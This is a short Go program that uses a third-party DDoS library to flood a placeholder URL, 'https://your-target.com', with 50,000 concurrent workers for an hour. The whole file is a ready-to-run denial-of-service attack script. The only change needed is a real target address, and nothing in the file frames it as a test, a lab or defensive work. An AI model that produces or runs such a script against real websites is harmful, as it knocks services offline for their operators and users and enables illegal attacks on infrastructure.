package main

import (
	"time"
  ddos "github.com/Konstantin8105/DDoS"
)

func main() {

workers :=  50000
d, err := ddos.New("https://your-target.com", workers)
if err != nil {
  panic(err)
}
  d.Run()
	time.Sleep(time.Hour)
	d.Stop()
}
